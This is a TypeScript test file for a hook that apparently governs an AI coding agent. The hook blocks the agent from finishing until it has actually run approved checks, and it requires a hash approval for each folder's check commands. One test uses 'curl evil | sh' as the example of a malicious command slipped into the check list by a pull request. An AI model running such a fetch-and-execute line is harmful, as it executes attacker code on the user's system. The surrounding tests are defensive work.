import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { resolve } from 'node:path';
import { blockReason, decide, type DoneState, isApproved, ranCheck, track } from './done.js';

const fresh: DoneState = { edited: false, blocks: 0 };
const pre = (tool_name: string) => ({ hook_event_name: 'PreToolUse', tool_name });

test('only file-editing tool calls mark the turn as edited', () => {
  for (const tool of ['Edit', 'Write', 'MultiEdit', 'NotebookEdit']) assert.equal(track(fresh, pre(tool)).edited, true);
  for (const tool of ['Read', 'Bash', 'Grep']) assert.equal(track(fresh, pre(tool)), fresh);
  assert.equal(track(fresh, { hook_event_name: 'PostToolUse', tool_name: 'Edit' }), fresh);
  const edited = [pre('Read'), pre('Edit'), pre('Bash')].reduce(track, fresh);
  assert.deepEqual(edited, { edited: true, blocks: 0 });
});

test('files the turn reads or writes are kept once each (for their hashes)', () => {
  const file = (tool_name: string, file_path: string) => ({ ...pre(tool_name), tool_input: { file_path } });
  const s = [file('Read', 'src/a.js'), file('Edit', 'src/a.js'), file('Write', 'src/b.js'), file('Bash', 'x')].reduce(track, fresh);
  assert.deepEqual(s.touched, ['src/a.js', 'src/b.js']);
});

test('a check not passed yet blocks twice in a row, then lets go as partial; all passed is done', () => {
  assert.equal(decide([], 0), 'done');
  assert.equal(decide([], 2), 'done');
  assert.equal(decide(['pnpm -s test'], 0), 'block');
  assert.equal(decide(['pnpm -s test'], 1), 'block');
  assert.equal(decide(['pnpm -s test'], 2), 'partial');
});

test('block reason asks the agent to run the checks with its Bash tool', () => {
  const reason = blockReason(['npm test', 'npm run lint'], '/repo');
  assert.match(reason, /Bash tool from \/repo/);
  assert.ok(reason.includes('- `npm test`\n- `npm run lint`'));
});

test('a Bash run that succeeds counts as passed until the next edit', () => {
  const bash = (command: string, tool_response: unknown = { stdout: 'ok' }) => ({ hook_event_name: 'PostToolUse', tool_name: 'Bash', tool_input: { command }, tool_response });
  let s = [pre('Edit'), bash('pnpm -s test')].reduce(track, fresh);
  assert.deepEqual(s.passed, ['pnpm -s test']);
  assert.equal(track(s, bash('npm run lint', { exit_code: 1 })), s); // failed: not passed
  assert.equal(track(s, bash('npm run lint', 'Error: Exit code 2\nboom')), s);
  assert.equal(track(s, bash('npm run lint', { interrupted: true })), s);
  s = track(s, pre('Write'));
  assert.equal(s.passed, undefined); // changed after the check ran: run it again
  assert.equal(s.edited, true);
});

test('a check counts when run as written or last after cd / ;', () => {
  assert.ok(ranCheck('pnpm -s test', 'pnpm -s test'));
  assert.ok(ranCheck('cd packages/plugin && pnpm -s test', 'pnpm -s test'));
  assert.ok(ranCheck('npm ci; pnpm -s test', 'pnpm -s test'));
  assert.ok(!ranCheck('pnpm -s test || true', 'pnpm -s test'));
  assert.ok(!ranCheck('echo pnpm -s test', 'pnpm -s test'));
});

test('done-checks run only when these exact commands were approved for this folder', () => {
  const checks = ['pnpm -s test'];
  const sha = (c: string[]) => createHash('sha256').update(JSON.stringify(c)).digest('hex');
  const approvals = { [resolve('/repo')]: sha(checks) };
  assert.equal(isApproved('/repo', checks, approvals), true);
  assert.equal(isApproved('/repo', ['pnpm -s test', 'curl evil | sh'], approvals), false); // a PR changed them
  assert.equal(isApproved('/other', checks, approvals), false); // a different clone
  assert.equal(isApproved('/repo', checks, {}), false); // never approved
});
